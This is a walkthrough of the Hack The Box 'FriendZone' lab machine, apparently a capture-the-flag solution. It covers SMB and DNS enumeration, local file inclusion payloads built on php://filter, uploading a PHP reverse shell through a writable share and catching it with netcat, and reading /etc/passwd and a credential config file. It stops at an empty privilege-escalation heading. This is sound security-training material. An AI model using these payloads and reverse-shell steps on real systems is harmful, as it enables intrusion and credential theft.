# HTB FriendZone (10.10.10.123) Write-up
## PART 1 : Initial Recon

```console
nmap --min-rate 1000 -p- -v 10.10.10.123
```
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
```
```console
nmap -oN friendzone -p21,22,53,80,139,445 -sC -sV -v 10.10.10.123
```
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-04-16T08:46:11+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-04-16 13:46:11
|_  start_date: N/A
```
Notes:
- There is an FTP, SSH, DNS, HTTP, HTTPS, and SMB service available
- The FTP service does not allow anonymous logins

---
## PART 2 : Port Enumeration

1. Explore __SMB__ service
   1. Enumeration
      ```console
      enum4linux -a 10.10.10.123
      ```
      ```
      ...

       ====================================================
      |    Enumerating Workgroup/Domain on 10.10.10.123    |
       ====================================================
      [+] Got domain/workgroup name: WORKGROUP

      ...

       =====================================
      |    Session Check on 10.10.10.123    |
       =====================================
      [+] Server 10.10.10.123 allows sessions using username '', password ''

      ...

       =========================================
      |    Share Enumeration on 10.10.10.123    |
       =========================================

              Sharename       Type      Comment
              ---------       ----      -------
              print$          Disk      Printer Drivers
              Files           Disk      FriendZone Samba Server Files /etc/Files
              general         Disk      FriendZone Samba Server Files
              Development     Disk      FriendZone Samba Server Files
              IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
      Reconnecting with SMB1 for workgroup listing.

              Server               Comment
              ---------            -------

              Workgroup            Master
              ---------            -------
              WORKGROUP            FRIENDZONE

      [+] Attempting to map shares on 10.10.10.123
      //10.10.10.123/print$           Mapping: DENIED, Listing: N/A
      //10.10.10.123/Files            Mapping: DENIED, Listing: N/A
      //10.10.10.123/general          Mapping: OK, Listing: OK
      //10.10.10.123/Development      Mapping: OK, Listing: OK
      //10.10.10.123/IPC$             [E] Can't understand response:
      NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

      ...
      ```
      Notes:
      - Workgroup name is __WORKGROUP__
      - __/etc/Files__ was listed as comment for __Files__ share
      - __general__ and __Development__ shares does not require authentication
      
   1. Explore available __shares__
      1. //10.10.10.123/general
         ```console
         smbclient \\\\WORKGROUP\\general -I 10.10.10.123 -N
         ```
         - While inside the client:
           ```console
           dir     
           # creds.txt      N     57  Wed Oct 10 07:52:42 2018
           
           get creds.txt
           ```
         - __creds.txt__ contents:
           ```
           creds for the admin THING:

           admin:WORKWORKHhallelujah@#
           ```
      1. //10.10.10.123/Development
         ```console
         smbclient \\\\WORKGROUP\\Development -I 10.10.10.123 -N
         ```
         - While inside the client:
           ```console
           dir
           # .              D      0  Thu Jan 17 04:03:49 2019
           # ..             D      0  Thu Jan 24 05:51:02 2019
           ```
      Notes:
      - __general__ share contains __admin credentials__
      - __Development__ share is __empty__

2. Visit http://10.10.10.123
   - Page Source:
     ```html
     <title>Friend Zone Escape software</title>

     <center><h2>Have you ever been friendzoned ?</h2></center>

     <center><img src="fz.jpg"></center>

     <center><h2>if yes, try to get out of this zone ;)</h2></center>

     <center><h2>Call us at : +999999999</h2></center>

     <center><h2>Email us at: info@friendzoneportal.red</h2></center>
     ```
     Notes:
     - __friendzoneportal.red__ is a domain name

3. Do a DNS lookup for __friendzoneportal.red__ with _zone transfer_
   1. Enumeration:
      ```console
      dig @10.10.10.123 friendzoneportal.red axfr
      
      # friendzoneportal.red.         604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
      # friendzoneportal.red.         604800  IN     AAAA    ::1
      # friendzoneportal.red.         604800  IN     NS      localhost.
      # friendzoneportal.red.         604800  IN     A       127.0.0.1
      # admin.friendzoneportal.red.   604800  IN     A       127.0.0.1
      # files.friendzoneportal.red.   604800  IN     A       127.0.0.1
      # imports.friendzoneportal.red. 604800  IN     A       127.0.0.1
      # vpn.friendzoneportal.red.     604800  IN     A       127.0.0.1
      # friendzoneportal.red.         604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
      ```
   2. Add _subdomains_ to __/etc/hosts__
      ```
      127.0.0.1       localhost
      127.0.1.1       kali f
      10.10.10.123    friendzoneportal.red
      10.10.10.123    admin.friendzoneportal.red
      10.10.10.123    files.friendzoneportal.red    \\\DEAD END
      10.10.10.123    imports.friendzoneportal.red  \\\DEAD END
      10.10.10.123    vpn.friendzoneportal.red      \\\DEAD END

      # The following lines are desirable for IPv6 capable hosts
      ::1     localhost ip6-localhost ip6-loopback
      ff02::1 ip6-allnodes
      ff02::2 ip6-allrouters
      ```
4. Visit http://admin.friendzoneportal.red
   - Loads homepage of http://10.10.10.123
   
5. Visit http://10.10.10.123:443
   - HTTP Response
     ```html
     <h1>Bad Request</h1>
     <p>Your browser sent a request that this server could not understand.<br />
     Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
     Instead use the HTTPS scheme to access this URL, please.<br />
     </p>
     <hr>
     <address>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 443</address>
     ```
   - Switch to https://10.10.10.123
   - Check SSL Certificate
     ```console
     openssl s_client -connect 10.10.10.123:443 -quiet
     ```
     ```html
     depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
     verify error:num=18:self signed certificate
     verify return:1
     depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
     verify error:num=10:certificate has expired
     notAfter=Nov  4 21:02:30 2018 GMT
     verify return:1
     depth=0 C = JO, ST = CODERED, L = AMMAN, O = CODERED, OU = CODERED, CN = friendzone.red, emailAddress = haha@friendzone.red
     notAfter=Nov  4 21:02:30 2018 GMT
     verify return:1

     HTTP/1.1 400 Bad Request
     Date: Tue, 16 Apr 2019 08:57:42 GMT
     Server: Apache/2.4.29 (Ubuntu)
     Content-Length: 302
     Connection: close
     Content-Type: text/html; charset=iso-8859-1

     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
     <html><head>
     <title>400 Bad Request</title>
     </head><body>
     <h1>Bad Request</h1>
     <p>Your browser sent a request that this server could not understand.<br />
     </p>
     <hr>
     <address>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 443</address>
     </body></html>
     ```
     Notes:
     - __friendzone.red__ is another _domain name_
     - Try accessing subdomains over __https__

6. Visit https://admin.friendzoneportal.red
   - Page Source:
     ```html
     <title>Admin Page</title>

     <center><h2>Login and break some friendzones !</h2></center>

     <center><h2>Spread the love !</h2></center>

     <center>
     <form name="login" method="POST" action="login.php">

     <p>Username : <input type="text" name="username"></p>
     <p>Password : <input type="password" name="password"></p>
     <p><input type="submit" value="Login"></p>

     </form>
     </center>
     ```
   - Response after successful logging using credentials from __creds.txt__
     ```html
     <h1>Admin page is not developed yet !!! check for another one</h1>
     ```
   Notes:
   - Maybe there is another admin page in __friendzone.red__

7. Do a DNS lookup for __friendzone.red__ with _zone transfer_
   1. Enumeration:
      ```console
      dig @10.10.10.123 friendzone.red axfr
    
      # friendzone.red.                 604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
      # friendzone.red.                 604800  IN     AAAA    ::1
      # friendzone.red.                 604800  IN     NS      localhost.
      # friendzone.red.                 604800  IN     A       127.0.0.1
      # administrator1.friendzone.red.  604800  IN     A       127.0.0.1
      # hr.friendzone.red.              604800  IN     A       127.0.0.1
      # uploads.friendzone.red.         604800  IN     A       127.0.0.1
      # friendzone.red.                 604800  IN     SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
      ```
   2. Add _subdomains_ to __/etc/hosts__
      ```
      127.0.0.1       localhost
      127.0.1.1       kali f
      10.10.10.123    friendzone.red
      10.10.10.123    administrator1.friendzone.red
      10.10.10.123    hr.friendzone.red             \\\DEAD END
      10.10.10.123    uploads.friendzone.red        

      # The following lines are desirable for IPv6 capable hosts
      ::1     localhost ip6-localhost ip6-loopback
      ff02::1 ip6-allnodes
      ff02::2 ip6-allrouters
      ```
8. Visit https://administrator1.friendzone.red
   - Snippet from Page Source:
     ```html
     <form method="POST" action="login.php" name="Login" class="login-form">
       <input type="text" name="username" placeholder="username"/>
       <input type="password" name="password" placeholder="password"/>
       <button>login</button>
     </form>
     ```
   - Response after successful logging using credentials from __creds.txt__
     ```
     Login Done ! visit /dashboard.php
     ```
9. Go to https://administrator1.friendzone.red/dashboard.php
   - Page Source:
     ```html
     <title>FriendZone Admin !</title>
     <br><br><br>
     <center><h2>Smart photo script for friendzone corp !</h2></center>
     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>        
     <br><br>
     <center><p>image_name param is missed !</p></center>
     <center><p>please enter it to show the image</p></center>
     <center><p>default is image_id=a.jpg&pagename=timestamp</p></center>
     ```
   - __/dashboard.php?image_id=a.jpg&pagename=timestamp__ 
     ```html
     <title>FriendZone Admin !</title>
     <br><br><br>
     <center><h2>Smart photo script for friendzone corp !</h2></center>
     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>  
     <center>
       <img src='images/a.jpg'></center><center>
       <h1>Something went worng ! , the script include wrong param !</h1>
     </center>
     Final Access timestamp is 1555410914
     ```
   Notes:
   - The __image_id__ parameter is loaded from a directory __images/__
   - The __pagename__ parameter might be exploitable
---

## PART 3 : Generate User Shell

1. Exploit __pagename__ parameter from https://administrator1.friendzone.red/dashboard.php
   - Attempt LFI using __php://filter__
     ```
     /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp
     ```
     Page Source:
     ```html
     <title>FriendZone Admin !</title>
     <br><br><br>
     <center><h2>Smart photo script for friendzone corp !</h2></center>
     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
     <center><img src='images/a.jpg'></center>
     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
     PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=
     ```
     Decoding the __base64__ output:
     ```console
     echo PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo= | base64 --decode
     ```
     The source code for __timestamp.php__ appears:
     ```PHP
     <?php


     $time_final = time() + 3600;

     echo "Final Access timestamp is $time_final";


     ?>
     ```
   - Now try reading other files (e.g. dashboard.php)
     ```
     /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
     ```
     Page Source:
     ```html
     <title>FriendZone Admin !</title>
     <br><br><br>
     <center><h2>Smart photo script for friendzone corp !</h2></center>
     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
     <center><img src='images/a.jpg'></center>
     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
     PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
     ```
     Decoding the __base64__ output:
     ```console
     echo PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo= | base64 --decode
     ```
     The source code for __dashboard.php__ appears:
     ```PHP
     <?php

     //echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
     //echo "<center><h3>* Note : we are dealing with a beginner php developer andthe application is not tested yet !</h3></center>";
     echo "<title>FriendZone Admin !</title>";
     $auth = $_COOKIE["FriendZoneAuth"];

     if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
       echo "<br><br><br>";

       echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
       echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

       if(!isset($_GET["image_id"])){
         echo "<br><br>";
         echo "<center><p>image_name param is missed !</p></center>";
         echo "<center><p>please enter it to show the image</p></center>";
         echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
       } else {
         $image = $_GET["image_id"];
         echo "<center><img src='images/$image'></center>";

         echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
         include($_GET["pagename"].".php");
         //echo $_GET["pagename"];
       }
     } else {
       echo "<center><p>You can't see the content ! , please login !</center></p>";
     }
     ?>
     ```
     Notes:
     - __dashboard.php__ gets the filename of PHP files and then adds the extension __.php__
     - __dashboard.php__ runs the file from the pagename parameter
     - Upload a malicious PHP file and access it using __dashboard.php__
   
2. Explore https://uploads.friendzone.red
   - Page Source:
     ```html
     <title>FriendZone Escape software upload manager</title>

     <body>
     <center><h2>Want to upload Stuff ??</h2></center>

     <form action="upload.php" method="post" enctype="multipart/form-data">
         Select an image to upload (only images):
         <input type="file" name="imageu" id="file">
         <input type="hidden" name="image">
         <input type="submit" value="Upload" name="Upload">
     </form>

     </body>
     ```
   - Test if it accepts non-image files
     - Create payload (__test.php__)
       ```console
       echo "<?php echo \"hello world\"; ?>" > test.php
       ```
     - Response after uploading __test.php__
       ```html
       Uploaded successfully !<br>1555476301
       ```
     Notes:
     - It accepts non-image files
     - The directory of the uploaded files is still unknown
     
   - Find the uploaded files
     ```console
     gobuster -k -u https://uploads.friendzone.red/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt 
     # /files (Status: 301)
     
     gobuster -k -u https://uploads.friendzone.red/files -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
     # /note (Status: 200)
     ```
     Visiting https://uploads.friendzone.red/files/note
     ```
     under development !
     ```
     Notes:
     - Perhaps "under development" points to the __Development share__ from earlier

3. Check if __test.php__ was really successfully uploaded
   - Reopen __Development share__:
     ```console
     smbclient \\\\WORKGROUP\\Development -I 10.10.10.123 -N
     ```
     While inside the client:
     ``` console
     dir
     # .              D      0  Thu Jan 17 04:03:49 2019
     # ..             D      0  Thu Jan 24 05:51:02 2019
     ```
     Notes:
     - The __Development share__ is still empty
     
   - Try to read the source code of __uploads.php__
     ```
     /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload
     ```
     Page Source:
     ```html
     <title>FriendZone Admin !</title>
     <br><br><br>
     <center><h2>Smart photo script for friendzone corp !</h2></center>
     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
     <center><img src='images/a.jpg'></center>
     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
     PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K
     ```
     Decoding the __base64__ output:
     ```console
     echo PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K | base64 --decode
     ```
     The source code for __../uploads/upload.php__ appears:
     ```PHP
     <?php

     // not finished yet -- friendzone admin !

     if(isset($_POST["image"])){

     echo "Uploaded successfully !<br>";
     echo time()+3600;
     }else{

     echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

     }

     ?>
     ```
     Notes:
     - The uploaded file is not saved anywhere...
     - https://uploads.friendzone.red is actually a dead end
     
4. Linking the __Development share__ and __dashboard.php__
   - Upload __test.php__ directly to the __Development share__
     ```console
     smbclient \\\\WORKGROUP\\Development -c "put test.php test.php" -I 10.10.10.123 -N   
     # putting file test.php as \test.php (0.0 kb/s) (average 0.0 kb/s)
     ```
     Notes:
     - __/etc/Files__ was commented for the __Files share__ during share enumeration in `enum4linux`
     - Maybe files in the __Development share__ are saved in __/etc/Development__
     
   - Attempt LFI at the __/etc/Development__ directory using __dashboard.php__
     ```
     /dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
     ```
     Page Source:
     ```html
     <title>FriendZone Admin !</title>
     <br><br><br>
     <center><h2>Smart photo script for friendzone corp !</h2></center>
     <center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>
     <center><img src='images/a.jpg'></center>
     <center><h1>Something went worng ! , the script include wrong param !</h1></center>
     hello world
     ```
     Notes:
     - The files in the __Development share__ are indeed saved in /etc/Development
     
   - Upload PHP reverse shell
     - Download shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
     - Update values __$ip__ and __$port__
     - Upload to the __Development share__
       ```console
       smbclient \\\\WORKGROUP\\Development -c "put shell.php shell.php" -I 10.10.10.123 -N
       # putting file shell.php as \shell.php (7.0 kb/s) (average 7.0 kb/s)
       ```
   - Establish shell
     - Set-up local __netcat listener__:
       ```console
       nc -lvp 4444
       ```
     - Run shell using __dashboard.php__:
       ```
       https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell
       ```
   - While inside the shell:
     ```console
     id
     # uid=33(www-data) gid=33(www-data) groups=33(www-data)

     cat /etc/passwd | grep bash
     # root:x:0:0:root:/root:/bin/bash
     # friend:x:1000:1000:friend,,,:/home/friend:/bin/bash

     find /var/www -name *conf* 2>/dev/null
     # /var/www/mysql_data.conf
     
     cat /var/www/mysql_data.conf
     ```
     __/var/www/mysql_data.conf__ contents:
     ```
     for development process this is the mysql creds for user friend

     db_user=friend

     db_pass=Agpyu12!0.213$

     db_name=FZ
     ```
     Notes:
     - There exists a user named __friend__
     - There are credentials for __friend__ in /var/www/mysql_data.conf
     
5. Login via SSH as user (__friend__)
   ```console
   ssh -l friend 10.10.10.123
   # friend@10.10.10.123's password: Agpyu12!0.213$
   ```
   - While inside shell:
     ```console
     find ~ -name user.txt
     # /home/friend/user.txt
     
     cat /home/friend/user.txt
     # a9ed20acecd6c5b6b52f474e15ae9a11
     ```
---
## PART 4 : Privilege Escalation (friend -> root)
   
